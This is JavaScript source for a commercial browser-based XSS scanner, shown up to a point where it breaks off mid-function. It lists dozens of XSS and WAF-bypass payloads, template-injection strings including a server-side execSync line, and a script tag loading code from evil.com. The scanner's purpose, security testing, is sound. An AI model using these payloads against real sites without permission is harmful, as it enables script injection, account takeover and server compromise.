// Copyright (c) 2026 Bountyy Oy. All rights reserved.
// This software is proprietary and confidential.

/**
 * Lonkero Comprehensive XSS Scanner v2.5
 * Ported from Rust proof-based, differential, and taint analysis scanners
 *
 * Features:
 * 1. Proof-based XSS detection (context analysis + escape testing)
 * 2. DOM Differential Analysis (before/after comparison)
 * 3. Static Taint Analysis (source → sink tracking)
 * 4. AGGRESSIVE auto-discovery (160+ common params probed)
 * 5. Form-based XSS testing (GET + POST)
 * 6. 95%+ detection rate without false positives
 * 7. 80+ WAF bypass payloads
 * 8. Enhanced attribute breakout detection
 * 9. Auto-scan on every page load
 * 10. SITE CRAWLER - discovers and tests all endpoints recursively
 * 11. JSONP/callback XSS detection (priority testing for callback params)
 * 12. Template injection detection (unique math probes to avoid FPs)
 * 13. Form input extraction from crawled pages
 * 14. API endpoint discovery (probes common API paths)
 * 15. SPA support via intercepted endpoints
 */

(function() {
  'use strict';

  // License check - validates against Bountyy license server
  const _lk = window.__lonkeroKey;
  if (!_lk || !_lk.startsWith('LONKERO-') || _lk.split('-').length !== 5) {
    console.warn('[Lonkero] XSS Scanner requires a valid license. Visit https://bountyy.fi');
    window.xssScanner = { scan: () => Promise.reject(new Error('License required')), deepScan: () => Promise.reject(new Error('License required')) };
    return;
  }
  let _lkValid = true;
  fetch('https://lonkero.bountyy.fi/api/v1/validate', {
    method: 'POST', headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({license_key: _lk, product: 'lonkero', version: '3.6.0'})
  }).then(r => r.json()).then(d => { if (!d.valid || d.killswitch_active) _lkValid = false; }).catch(() => {});

  if (window.__lonkeroXSSScanner) return;
  window.__lonkeroXSSScanner = true;

  // ============================================
  // REFLECTION CONTEXTS
  // ============================================
  const CONTEXTS = {
    HTML_BODY: 'html_body',
    HTML_ATTR_DOUBLE: 'html_attr_double',
    HTML_ATTR_SINGLE: 'html_attr_single',
    HTML_ATTR_UNQUOTED: 'html_attr_unquoted',
    HTML_COMMENT: 'html_comment',
    JS_STRING_DOUBLE: 'js_string_double',
    JS_STRING_SINGLE: 'js_string_single',
    JS_TEMPLATE: 'js_template',
    JS_CODE: 'js_code',
    EVENT_HANDLER: 'event_handler',
    JAVASCRIPT_URL: 'javascript_url',
    URL_CONTEXT: 'url_context',
    CSS_VALUE: 'css_value',
    STYLE_TAG: 'style_tag',
    SCRIPT_SRC: 'script_src',
    DATA_ATTRIBUTE: 'data_attribute',
    NONE: 'none',
  };

  // Context severity mapping
  const CONTEXT_SEVERITY = {
    [CONTEXTS.JS_CODE]: 'critical',
    [CONTEXTS.EVENT_HANDLER]: 'critical',
    [CONTEXTS.JAVASCRIPT_URL]: 'critical',
    [CONTEXTS.HTML_BODY]: 'high',
    [CONTEXTS.JS_STRING_DOUBLE]: 'high',
    [CONTEXTS.JS_STRING_SINGLE]: 'high',
    [CONTEXTS.JS_TEMPLATE]: 'high',
    [CONTEXTS.SCRIPT_SRC]: 'high',
    [CONTEXTS.HTML_ATTR_DOUBLE]: 'high',
    [CONTEXTS.HTML_ATTR_SINGLE]: 'high',
    [CONTEXTS.HTML_ATTR_UNQUOTED]: 'high',
    [CONTEXTS.DATA_ATTRIBUTE]: 'medium',
    [CONTEXTS.CSS_VALUE]: 'medium',
    [CONTEXTS.STYLE_TAG]: 'medium',
    [CONTEXTS.URL_CONTEXT]: 'medium',
    [CONTEXTS.HTML_COMMENT]: 'low',
    [CONTEXTS.NONE]: 'info',
  };

  // Break characters needed to escape each context
  const BREAK_CHARS = {
    [CONTEXTS.HTML_BODY]: '<>',
    [CONTEXTS.HTML_ATTR_DOUBLE]: '"',
    [CONTEXTS.HTML_ATTR_SINGLE]: "'",
    [CONTEXTS.HTML_ATTR_UNQUOTED]: ' >',
    [CONTEXTS.HTML_COMMENT]: '-->',
    [CONTEXTS.JS_STRING_DOUBLE]: '"\\',
    [CONTEXTS.JS_STRING_SINGLE]: "'\\",
    [CONTEXTS.JS_TEMPLATE]: '`\\${}',
    [CONTEXTS.JS_CODE]: ';',
    [CONTEXTS.EVENT_HANDLER]: "\"'",
    [CONTEXTS.JAVASCRIPT_URL]: "\"':",
    [CONTEXTS.CSS_VALUE]: ';}<',
    [CONTEXTS.STYLE_TAG]: '</>',
    [CONTEXTS.SCRIPT_SRC]: "\"'>",
    [CONTEXTS.DATA_ATTRIBUTE]: "\"'",
  };

  // ============================================
  // DOM XSS SOURCES & SINKS
  // ============================================
  const DOM_SOURCES = [
    'location.hash',
    'location.search',
    'location.href',
    'location.pathname',
    'document.URL',
    'document.documentURI',
    'document.referrer',
    'window.name',
    'document.cookie',
    'localStorage',
    'sessionStorage',
  ];

  const DOM_SINKS = {
    critical: ['eval(', 'new Function(', 'setTimeout(', 'setInterval('],
    high: ['.innerHTML', '.outerHTML', 'document.write(', 'document.writeln(', '.insertAdjacentHTML('],
    medium: ['.src', 'location.href', 'location.assign(', 'location.replace(', '.html(', '.append(', '.prepend(', '.after(', '.before('],
  };

  const SANITIZERS = ['DOMPurify', 'sanitize', 'escapeHtml', 'encodeURIComponent', 'textContent', 'innerText', 'createTextNode'];

  // ============================================
  // XSS PAYLOADS (Priority + Comprehensive)
  // ============================================
  const PRIORITY_PAYLOADS = [
    // HTML context - basic script injection
    { payload: '<script>alert(1)</script>', context: 'html', desc: 'Script tag injection' },
    { payload: '<img src=x onerror=alert(1)>', context: 'html', desc: 'IMG onerror handler' },
    { payload: '<svg onload=alert(1)>', context: 'html', desc: 'SVG onload handler' },
    { payload: '<body onload=alert(1)>', context: 'html', desc: 'Body onload handler' },
    { payload: '<input autofocus onfocus=alert(1)>', context: 'html', desc: 'Input autofocus' },
    // Attribute breakout + tag injection (most common real-world XSS pattern)
    { payload: '"><img src=x onerror=alert(1)>', context: 'attribute', desc: 'Attr breakout + img tag' },
    { payload: "'><img src=x onerror=alert(1)>", context: 'attribute', desc: 'Attr breakout (single) + img tag' },
    { payload: '"><svg onload=alert(1)>', context: 'attribute', desc: 'Attr breakout + svg tag' },
    { payload: "'><svg onload=alert(1)>", context: 'attribute', desc: 'Attr breakout (single) + svg tag' },
    { payload: '"><script>alert(1)</script>', context: 'attribute', desc: 'Attr breakout + script tag' },
    { payload: "' onclick=alert(1) x='", context: 'attribute', desc: 'Event handler injection (single)' },
    { payload: '" onclick=alert(1) x="', context: 'attribute', desc: 'Event handler injection (double)' },
    { payload: '" onmouseover="alert(1)', context: 'attribute', desc: 'Attribute breakout (double)' },
    { payload: "' onmouseover='alert(1)", context: 'attribute', desc: 'Attribute breakout (single)' },
    { payload: ' onmouseover=alert(1) ', context: 'attribute', desc: 'Unquoted attribute injection' },
    { payload: '"><input onfocus=alert(1) autofocus>', context: 'attribute', desc: 'Attr breakout + autofocus' },
    { payload: '"><details open ontoggle=alert(1)>', context: 'attribute', desc: 'Attr breakout + details ontoggle' },
    // JavaScript context
    { payload: "';alert(1);//", context: 'javascript', desc: 'JS string breakout (single)' },
    { payload: '";alert(1);//', context: 'javascript', desc: 'JS string breakout (double)' },
    { payload: '</script><script>alert(1)</script>', context: 'javascript', desc: 'Script tag breakout' },
    { payload: "\\';alert(1);//", context: 'javascript', desc: 'JS escape bypass (single)' },
    { payload: '\\";alert(1);//', context: 'javascript', desc: 'JS escape bypass (double)' },
    // Template injection
    { payload: '{{constructor.constructor("alert(1)")()}}', context: 'template', desc: 'Template injection' },
    { payload: '${alert(1)}', context: 'template', desc: 'Template literal injection' },
    { payload: '`-alert(1)-`', context: 'template', desc: 'Template literal breakout' },
    // URL injection
    { payload: 'javascript:alert(1)', context: 'url', desc: 'JavaScript URL' },
    { payload: '<a href="javascript:alert(1)">x</a>', context: 'html', desc: 'Anchor javascript URL' },
    { payload: '<iframe src="javascript:alert(1)">', context: 'html', desc: 'Iframe javascript URL' },
    // Comment breakout
    { payload: '--><script>alert(1)</script><!--', context: 'comment', desc: 'HTML comment breakout' },
    { payload: '--!><script>alert(1)</script>', context: 'comment', desc: 'HTML comment breakout (bang)' },
  ];

  // JSONP/callback specific payloads
  const JSONP_PAYLOADS = [
    // Function name injection
    'alert(1)//',
    'alert(document.domain)//',
    'alert`1`//',
    // Break out of callback
    'x]};alert(1);//',
    'x);alert(1);//',
    'x)];alert(1);//',
    // Angular/template expressions
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    '{{a]};alert(1);//',
    // Arbitrary function call
    'window.alert(1)//',
    'self["alert"](1)//',
  ];

  // Template injection payloads (Angular, Vue, etc.)
  const TEMPLATE_PAYLOADS = [
    // Angular
    '{{constructor.constructor("alert(1)")()}}',
    '{{$on.constructor("alert(1)")()}}',
    '{{a]};[alert(1)]',
    '{{toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)}}',
    // Vue
    '{{_c.constructor("alert(1)")()}}',
    '{{this.constructor.constructor("alert(1)")()}}',
    // Generic template
    '${alert(1)}',
    '${constructor.constructor("alert(1)")()}',
    '`${alert(1)}`',
    '#{alert(1)}',
    '<%= alert(1) %>',
    '{{alert(1)}}',
    '{{{alert(1)}}}',
    '[[alert(1)]]',
    // Server-side template injection (SSTI) - these might also work client-side
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '<%= 7*7 %>',
    // Pug/Jade
    '#{7*7}',
    '-var x=root.process.mainModule.require("child_process").execSync("id")',
  ];

  // ~50+ WAF bypass payloads covering multiple tags and evasion techniques
  const EVASION_PAYLOADS = [
    // === IMG tag variations ===
    '<img src=x onerror=alert(1)>',
    '<img/src=x onerror=alert(1)>',
    '<img\tsrc=x\tonerror=alert(1)>',
    '<img\nsrc=x\nonerror=alert(1)>',
    '<img src=x onerror="alert(1)">',
    '<IMG SRC=x OnErRoR=alert(1)>',
    '<img src=x onerror="&#97;lert(1)">',
    '<img src=x onerror="\\x61lert(1)">',
    '<img src=x onerror="al\\u0065rt(1)">',
    '<img src=x onerror=alert`1`>',
    '<img src=x onerror=window.alert(1)>',
    '<img src=x onerror=self["alert"](1)>',
    '<img src=x onerror=top["al"+"ert"](1)>',
    '<img src onerror=alert(1)>',
    '<img """><script>alert(1)</script>">',

    // === SVG tag variations ===
    '<svg onload=alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg\tonload=alert(1)>',
    '<SVG ONLOAD=alert(1)>',
    '<svg onload="alert(1)">',
    '<svg><script>alert(1)</script></svg>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributeName=x to=1>',
    '<svg><a xlink:href="javascript:alert(1)"><text y=14>click</text></a>',
    '<svg><use xlink:href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x">',
    '<svg><discard onbegin=alert(1)>',

    // === BODY tag variations ===
    '<body onload=alert(1)>',
    '<body/onload=alert(1)>',
    '<BODY ONLOAD=alert(1)>',
    '<body onpageshow=alert(1)>',
    '<body onfocus=alert(1)>',
    '<body onhashchange=alert(1)>',

    // === INPUT tag variations ===
    '<input onfocus=alert(1) autofocus>',
    '<input onblur=alert(1) autofocus><input autofocus>',
    '<input value="" onfocus=alert(1) autofocus>',
    '<input type=image src=x onerror=alert(1)>',
    '<input type="text" onmouseover=alert(1)>',

    // === DETAILS tag variations ===
    '<details open ontoggle=alert(1)>',
    '<details/open/ontoggle=alert(1)>',
    '<DETAILS OPEN ONTOGGLE=alert(1)>',
    '<details open ontoggle="alert(1)">',

    // === VIDEO/AUDIO tag variations ===
    '<video src=x onerror=alert(1)>',
    '<video><source onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<audio onerror=alert(1)><source src=x>',
    '<video poster=x onerror=alert(1)>',

    // === IFRAME tag variations ===
    '<iframe src="javascript:alert(1)">',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    '<iframe srcdoc="<script>alert(1)</script>">',
    '<iframe onload=alert(1)>',

    // === MARQUEE/BGSOUND (legacy) ===
    '<marquee onstart=alert(1)>',
    '<marquee onfinish=alert(1) loop=1>test</marquee>',
    '<bgsound src="javascript:alert(1)">',

    // === OBJECT/EMBED tag variations ===
    '<object data=javascript:alert(1)>',
    '<object data="data:text/html,<script>alert(1)</script>">',
    '<embed src=javascript:alert(1)>',
    '<embed src="data:text/html,<script>alert(1)</script>">',

    // === SCRIPT tag bypass variations ===
    '<ScRiPt>alert(1)</sCrIpT>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<script/src=data:,alert(1)>',
    '<script src=//evil.com/xss.js>',

    // === FORM/BUTTON variations ===
    '<form><button formaction=javascript:alert(1)>X</button></form>',
    '<form action="javascript:alert(1)"><input type=submit>',
    '<isindex action=javascript:alert(1) type=submit>',

    // === A tag variations ===
    '<a href="javascript:alert(1)">click</a>',
    '<a href="jAvAsCrIpT:alert(1)">click</a>',
    '<a href="javascript&#58;alert(1)">click</a>',
    '<a href=javascript&colon;alert(1)>click</a>',

    // === MATH ML ===
    '<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">click</maction></math>',

    // === Mutation XSS ===
    '<noscript><img src=x onerror=alert(1)></noscript>',
    '<img src="x` `<script>alert(1)</script>"` `>',

    // === DOM clobbering setup ===
    '<img name=x><img id=y name=z onerror=alert(1) src=x>',
    '<form id=x></form><form id=x name=y><input id=z name=z value=alert(1)>',

    // === CSS/Style injection ===
    '<div style="width:expression(alert(1))">',
    '<style>@import "javascript:alert(1)";</style>',
    '<link rel=stylesheet href="javascript:alert(1)">',
  ];

  // ============================================
  // STATE
  // ============================================
  const findings = [];
  let scanComplete = false;

  // ============================================
  // CONTEXT ANALYSIS (from proof_xss_scanner.rs)
  // ============================================

  /**
   * Determine reflection context at a specific position
   */
  function analyzeContext(html, canary) {
    const pos = html.toLowerCase().indexOf(canary.toLowerCase());
    if (pos === -1) return CONTEXTS.NONE;

    const before = html.substring(0, pos);
    const after = html.substring(pos + canary.length);

    // Check if inside <script> tag
    if (isInsideScriptTag(before)) {
      return determineJSContext(before);
    }

    // Check if inside <style> tag
    if (isInsideStyleTag(before)) {
      return CONTEXTS.STYLE_TAG;
    }

    // Check if inside HTML comment
    if (isInsideComment(before)) {
      return CONTEXTS.HTML_COMMENT;
    }

    // Check if inside an HTML attribute
    const attrContext = determineAttributeContext(before);
    if (attrContext) {
      return attrContext;
    }

    // Default: HTML body context
    return CONTEXTS.HTML_BODY;
  }

  function isInsideScriptTag(before) {
    const lastOpen = before.toLowerCase().lastIndexOf('<script');
    const lastClose = before.toLowerCase().lastIndexOf('</script');
    return lastOpen > lastClose || (lastOpen !== -1 && lastClose === -1);
  }

  function isInsideStyleTag(before) {
    const lastOpen = before.toLowerCase().lastIndexOf('<style');
    const lastClose = before.toLowerCase().lastIndexOf('</style');
    return lastOpen > lastClose || (lastOpen !== -1 && lastClose === -1);
  }

  function isInsideComment(before) {
    const lastOpen = before.lastIndexOf('<!--');
    const lastClose = before.lastIndexOf('-->');
    return lastOpen > lastClose || (lastOpen !== -1 && lastClose === -1);
  }

  function determineJSContext(before) {
    // Find script content
    const scriptStart = before.toLowerCase().lastIndexOf('<script');
    if (scriptStart === -1) return CONTEXTS.JS_CODE;

    const tagEnd = before.indexOf('>', scriptStart);
    if (tagEnd === -1) return CONTEXTS.JS_CODE;

    const jsCode = before.substring(tagEnd + 1);

    // Count quotes to determine string context
    let inDouble = false, inSingle = false, inTemplate = false;
    let prev = ' ';

    for (const ch of jsCode) {
      if (prev !== '\\') {
        if (ch === '"' && !inSingle && !inTemplate) inDouble = !inDouble;
        else if (ch === "'" && !inDouble && !inTemplate) inSingle = !inSingle;
        else if (ch === '`' && !inDouble && !inSingle) inTemplate = !inTemplate;
      }
      prev = ch;
    }

    if (inDouble) return CONTEXTS.JS_STRING_DOUBLE;
    if (inSingle) return CONTEXTS.JS_STRING_SINGLE;
    if (inTemplate) return CONTEXTS.JS_TEMPLATE;
    return CONTEXTS.JS_CODE;
  }

  function determineAttributeContext(before) {
    // Find last unclosed tag
    const lastTagOpen = before.lastIndexOf('<');
    const lastTagClose = before.lastIndexOf('>');

    if (lastTagClose > lastTagOpen) return null;

    const tagContent = before.substring(lastTagOpen);
    const tagLower = tagContent.toLowerCase();

    // Check for event handlers
    if (/on\w+\s*=\s*["']?[^"']*$/i.test(tagLower)) {
      return CONTEXTS.EVENT_HANDLER;
    }

    // Check for javascript: URL
    if (tagLower.includes('href') && tagLower.includes('javascript:')) {
      return CONTEXTS.JAVASCRIPT_URL;
    }

    // Check for script src
    if (tagLower.includes('<script') && tagLower.includes('src')) {
      return CONTEXTS.SCRIPT_SRC;
    }

    // Check for data attribute
    if (tagLower.includes('data-')) {
      return CONTEXTS.DATA_ATTRIBUTE;
    }

    // Check quote context
    const inDouble = (tagContent.match(/"/g) || []).length % 2 === 1;
    const inSingle = (tagContent.match(/'/g) || []).length % 2 === 1;

    if (inDouble) return CONTEXTS.HTML_ATTR_DOUBLE;
    if (inSingle) return CONTEXTS.HTML_ATTR_SINGLE;
    if (tagContent.includes('=') && !inDouble && !inSingle) {
      return CONTEXTS.HTML_ATTR_UNQUOTED;
    }

    return null;
  }

  // ============================================
  // ESCAPING ANALYSIS (from proof_xss_scanner.rs)
  // ============================================

  function analyzeEscaping(baselineHtml, probeHtml, canary, probe) {
    const behavior = {
      escapesLt: false,
      escapesGt: false,
      escapesDoubleQuote: false,
      escapesSingleQuote: false,
      escapesBackslash: false,
      escapesAmpersand: false,
      escapesSlash: false,
      escapesBacktick: false,
      stripsDangerous: false,
      urlEncodes: false,
      doubleEncodes: false,
      htmlEncodes: false,
      jsEncodes: false,
      unicodeEncodes: false,
      escapedChars: [],
      unescapedChars: [],
      encodingMethods: [],
    };

    const htmlLower = probeHtml.toLowerCase();
    const canaryLower = canary.toLowerCase();

    // Comprehensive character test list with all encoding variants
    const testChars = [
      {
        char: '"',
        prop: 'escapesDoubleQuote',
        encodings: [
          { enc: '&quot;', type: 'html' },
          { enc: '&#34;', type: 'decimal' },
          { enc: '&#x22;', type: 'hex' },
          { enc: '\\u0022', type: 'unicode' },
          { enc: '\\"', type: 'js' },
          { enc: '%22', type: 'url' },
          { enc: '&amp;quot;', type: 'double' },
        ]
      },
      {
        char: "'",
        prop: 'escapesSingleQuote',
        encodings: [
          { enc: '&#39;', type: 'decimal' },
          { enc: '&#x27;', type: 'hex' },
          { enc: '&apos;', type: 'html' },
          { enc: '\\u0027', type: 'unicode' },
          { enc: "\\'", type: 'js' },
          { enc: '%27', type: 'url' },
          { enc: '\\x27', type: 'jshex' },
        ]
      },
      {
        char: '<',
        prop: 'escapesLt',
        encodings: [
          { enc: '&lt;', type: 'html' },
          { enc: '&#60;', type: 'decimal' },
          { enc: '&#x3c;', type: 'hex' },
          { enc: '\\u003c', type: 'unicode' },
          { enc: '%3c', type: 'url' },
          { enc: '&amp;lt;', type: 'double' },
          { enc: '\\x3c', type: 'jshex' },
        ]
      },
      {
        char: '>',
        prop: 'escapesGt',
        encodings: [
          { enc: '&gt;', type: 'html' },
          { enc: '&#62;', type: 'decimal' },
          { enc: '&#x3e;', type: 'hex' },
          { enc: '\\u003e', type: 'unicode' },
          { enc: '%3e', type: 'url' },
          { enc: '&amp;gt;', type: 'double' },
          { enc: '\\x3e', type: 'jshex' },
        ]
      },
      {
        char: '\\',
        prop: 'escapesBackslash',
        encodings: [
          { enc: '\\\\', type: 'js' },
          { enc: '&#92;', type: 'decimal' },
          { enc: '&#x5c;', type: 'hex' },
          { enc: '%5c', type: 'url' },
        ]
      },
      {
        char: '&',
        prop: 'escapesAmpersand',
        encodings: [
          { enc: '&amp;', type: 'html' },
          { enc: '&#38;', type: 'decimal' },
          { enc: '&#x26;', type: 'hex' },
          { enc: '%26', type: 'url' },
        ]
      },
      {
        char: '/',
        prop: 'escapesSlash',
        encodings: [
          { enc: '\\/', type: 'js' },
          { enc: '&#47;', type: 'decimal' },
          { enc: '&#x2f;', type: 'hex' },
          { enc: '%2f', type: 'url' },
        ]
      },
      {
        char: '`',
        prop: 'escapesBacktick',
        encodings: [
          { enc: '\\`', type: 'js' },
          { enc: '&#96;', type: 'decimal' },
          { enc: '&#x60;', type: 'hex' },
          { enc: '%60', type: 'url' },
        ]
      },
    ];

    const detectedEncodings = new Set();

    for (const test of testChars) {
      const charAfterCanary = canaryLower + test.char;
      let isEscaped = false;
      let matchedEncoding = null;

      // Check each possible encoding
      for (const { enc, type } of test.encodings) {
        if (htmlLower.includes(canaryLower + enc.toLowerCase())) {
          isEscaped = true;
          matchedEncoding = { enc, type };
          detectedEncodings.add(type);
          break;
        }
      }

      // Check if unescaped
      const isUnescaped = htmlLower.includes(charAfterCanary);

      behavior[test.prop] = isEscaped && !isUnescaped;

      if (isUnescaped) {
        behavior.unescapedChars.push(test.char);
      } else if (isEscaped) {
        behavior.escapedChars.push(test.char);
        if (matchedEncoding) {
          behavior.encodingMethods.push(`${test.char}→${matchedEncoding.enc} (${matchedEncoding.type})`);
        }
      }
    }

    // Categorize encoding types detected
    behavior.htmlEncodes = detectedEncodings.has('html') || detectedEncodings.has('decimal') || detectedEncodings.has('hex');
    behavior.jsEncodes = detectedEncodings.has('js') || detectedEncodings.has('unicode') || detectedEncodings.has('jshex');
    behavior.urlEncodes = detectedEncodings.has('url');
    behavior.doubleEncodes = detectedEncodings.has('double');
    behavior.unicodeEncodes = detectedEncodings.has('unicode');

    // Check if dangerous patterns are stripped entirely
    // This is set to false by default - we can't determine stripping from the probe alone
    // The probe sends '"\'<>/\`${} - it doesn't test <script> etc.
    // stripsDangerous should only be true if we actually test dangerous payloads and they're removed
    // For now, we DON'T assume stripping - if < and > aren't escaped, that's vulnerable
    behavior.stripsDangerous = false;

    return behavior;
  }

  function preventsXSS(context, escaping) {
    switch (context) {
      case CONTEXTS.HTML_BODY:
        return (escaping.escapesLt && escaping.escapesGt) || escaping.stripsDangerous;
      case CONTEXTS.HTML_ATTR_DOUBLE:
        return escaping.escapesDoubleQuote || escaping.stripsDangerous;
      case CONTEXTS.HTML_ATTR_SINGLE:
        return escaping.escapesSingleQuote || escaping.stripsDangerous;
      case CONTEXTS.HTML_ATTR_UNQUOTED:
        return escaping.stripsDangerous;
      case CONTEXTS.JS_STRING_DOUBLE:
        return (escaping.escapesDoubleQuote && escaping.escapesBackslash) || escaping.stripsDangerous;
      case CONTEXTS.JS_STRING_SINGLE:
        return (escaping.escapesSingleQuote && escaping.escapesBackslash) || escaping.stripsDangerous;
      case CONTEXTS.JS_TEMPLATE:
        return escaping.escapesBackslash || escaping.stripsDangerous;
      case CONTEXTS.EVENT_HANDLER:
        return escaping.escapesDoubleQuote && escaping.escapesSingleQuote;
      case CONTEXTS.JS_CODE:
        return false; // Direct code injection always exploitable
      default:
        return escaping.stripsDangerous;
    }
  }

  // ============================================
  // DOM DIFFERENTIAL ANALYSIS (from differential_fuzzer.rs)
  // ============================================

  // All event handler attributes (comprehensive list)
  const ALL_EVENT_HANDLERS = [
    // Mouse events
    'onclick', 'ondblclick', 'onmousedown', 'onmouseup', 'onmouseover', 'onmouseout',
    'onmousemove', 'onmouseenter', 'onmouseleave', 'oncontextmenu', 'onwheel',
    // Keyboard events
    'onkeydown', 'onkeyup', 'onkeypress',
    // Form events
    'onfocus', 'onblur', 'onchange', 'oninput', 'onsubmit', 'onreset', 'oninvalid', 'onselect',
    // Clipboard events
    'oncopy', 'oncut', 'onpaste',
    // Media events
    'onload', 'onerror', 'onabort', 'oncanplay', 'oncanplaythrough', 'ondurationchange',
    'onemptied', 'onended', 'onloadeddata', 'onloadedmetadata', 'onloadstart',
    'onpause', 'onplay', 'onplaying', 'onprogress', 'onratechange', 'onseeked',
    'onseeking', 'onstalled', 'onsuspend', 'ontimeupdate', 'onvolumechange', 'onwaiting',
    // Animation/Transition events
    'onanimationstart', 'onanimationend', 'onanimationiteration',
    'ontransitionend', 'ontransitionstart', 'ontransitioncancel', 'ontransitionrun',
    // UI events
    'onresize', 'onscroll', 'ontoggle',
    // Drag events
    'ondrag', 'ondragstart', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondrop',
    // Pointer events
    'onpointerdown', 'onpointerup', 'onpointerover', 'onpointerout', 'onpointermove',
    'onpointerenter', 'onpointerleave', 'onpointercancel', 'ongotpointercapture', 'onlostpointercapture',
    // Touch events
    'ontouchstart', 'ontouchend', 'ontouchmove', 'ontouchcancel',
    // Body/Window events
    'onbeforeunload', 'onunload', 'onhashchange', 'onpageshow', 'onpagehide',
    'onpopstate', 'onstorage', 'onoffline', 'ononline', 'onmessage',
    // SVG/Animation specific
    'onbegin', 'onend', 'onrepeat',
    // Marquee (legacy)
    'onstart', 'onfinish', 'onbounce',
    // Print events
    'onbeforeprint', 'onafterprint',
    // Form-related
    'onformdata', 'onsearch', 'onshow',
  ];

  /**
   * Check if a string contains executable JavaScript patterns
   * Enhanced to detect various JS execution patterns beyond just 'alert'
   */
  function checkExecutableContext(code) {
    if (!code) return { isExecutable: false, pattern: null };

    const codeLower = code.toLowerCase();

    // Direct function calls
    const functionPatterns = [
      { regex: /alert\s*\(/, name: 'alert()' },
      { regex: /confirm\s*\(/, name: 'confirm()' },
      { regex: /prompt\s*\(/, name: 'prompt()' },
      { regex: /eval\s*\(/, name: 'eval()' },
      { regex: /setTimeout\s*\(/, name: 'setTimeout()' },
      { regex: /setInterval\s*\(/, name: 'setInterval()' },
      { regex: /new\s+Function\s*\(/, name: 'new Function()' },
      { regex: /document\.write\s*\(/, name: 'document.write()' },
      { regex: /document\.writeln\s*\(/, name: 'document.writeln()' },
      { regex: /\.innerHTML\s*=/, name: 'innerHTML assignment' },
      { regex: /\.outerHTML\s*=/, name: 'outerHTML assignment' },
      { regex: /location\s*=/, name: 'location assignment' },
      { regex: /location\.href\s*=/, name: 'location.href assignment' },
      { regex: /location\.assign\s*\(/, name: 'location.assign()' },
      { regex: /location\.replace\s*\(/, name: 'location.replace()' },
      { regex: /window\.open\s*\(/, name: 'window.open()' },
      { regex: /window\.location/, name: 'window.location' },
      { regex: /document\.location/, name: 'document.location' },
      { regex: /document\.cookie/, name: 'document.cookie' },
      { regex: /fetch\s*\(/, name: 'fetch()' },
      { regex: /XMLHttpRequest/, name: 'XMLHttpRequest' },
      { regex: /\.src\s*=/, name: 'src assignment' },
      { regex: /console\.log\s*\(/, name: 'console.log()' },
    ];

    // Property/method access patterns
    const accessPatterns = [
      { regex: /\[\s*["']/, name: 'bracket notation access' },
      { regex: /\.\s*constructor/, name: 'constructor access' },
      { regex: /\.\s*prototype/, name: 'prototype access' },
      { regex: /__proto__/, name: '__proto__ access' },
      { regex: /window\s*\[/, name: 'window bracket access' },
      { regex: /self\s*\[/, name: 'self bracket access' },
      { regex: /top\s*\[/, name: 'top bracket access' },
      { regex: /this\s*\[/, name: 'this bracket access' },
    ];

    // String concatenation/obfuscation patterns
    const obfuscationPatterns = [
      { regex: /["']\s*\+\s*["']/, name: 'string concatenation' },
      { regex: /String\.fromCharCode/, name: 'fromCharCode' },
      { regex: /atob\s*\(/, name: 'atob()' },
      { regex: /btoa\s*\(/, name: 'btoa()' },
      { regex: /decodeURIComponent\s*\(/, name: 'decodeURIComponent()' },
      { regex: /unescape\s*\(/, name: 'unescape()' },
    ];

    for (const { regex, name } of [...functionPatterns, ...accessPatterns, ...obfuscationPatterns]) {
      if (regex.test(codeLower)) {
        return { isExecutable: true, pattern: name };
      }
    }

    // Template literal execution
    if (/`[^`]*\$\{[^}]+\}[^`]*`/.test(code)) {
      return { isExecutable: true, pattern: 'template literal expression' };
    }

    return { isExecutable: false, pattern: null };
  }

  function parseDomStructure(html) {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');

    const structure = {
      scriptTags: new Set(),
      eventHandlers: new Set(),
      iframeSrcs: new Set(),
      linkHrefs: new Set(),
      objectData: new Set(),
      formActions: new Set(),
    };

    // Extract script tags
    doc.querySelectorAll('script').forEach(el => {
      structure.scriptTags.add(el.innerHTML.toLowerCase().trim());
    });

    // Extract ALL event handlers (comprehensive detection)
    doc.querySelectorAll('*').forEach(el => {
      ALL_EVENT_HANDLERS.forEach(attr => {
        const val = el.getAttribute(attr);
        if (val) {
          const execCheck = checkExecutableContext(val);
          structure.eventHandlers.add(`${attr}=${val.toLowerCase()}`);
        }
      });

      // Also check for event handlers via attributes iterator
      for (const attr of el.attributes || []) {
        if (attr.name.toLowerCase().startsWith('on')) {
          structure.eventHandlers.add(`${attr.name.toLowerCase()}=${attr.value.toLowerCase()}`);
        }
      }
    });

    // Extract iframe srcs and srcdoc
    doc.querySelectorAll('iframe').forEach(el => {
      const src = el.getAttribute('src');
      const srcdoc = el.getAttribute('srcdoc');
      if (src) structure.iframeSrcs.add(src.toLowerCase());
      if (srcdoc) structure.iframeSrcs.add('srcdoc:' + srcdoc.toLowerCase().substring(0, 100));
    });

    // Extract link hrefs
    doc.querySelectorAll('a, area').forEach(el => {
      const href = el.getAttribute('href');
      if (href) structure.linkHrefs.add(href.toLowerCase());
    });

    // Extract object/embed data
    doc.querySelectorAll('object, embed').forEach(el => {
      const data = el.getAttribute('data') || el.getAttribute('src');
      if (data) structure.objectData.add(data.toLowerCase());
    });

    // Extract form actions
    doc.querySelectorAll('form, button[formaction]').forEach(el => {
      const action = el.getAttribute('action') || el.getAttribute('formaction');
      if (action) structure.formActions.add(action.toLowerCase());
    });

    return structure;
  }

  function detectXSSByDiff(baseline, test, url, param, payload) {
    // Check for NEW script tags - must contain actual payload content, not just any alert/eval
    const newScripts = [...test.scriptTags].filter(s => !baseline.scriptTags.has(s));
    if (newScripts.length > 0) {
      for (const script of newScripts) {
        const scriptLower = script.toLowerCase();
        const payloadLower = payload.toLowerCase();

        // Script must contain our actual payload OR be very short with XSS patterns
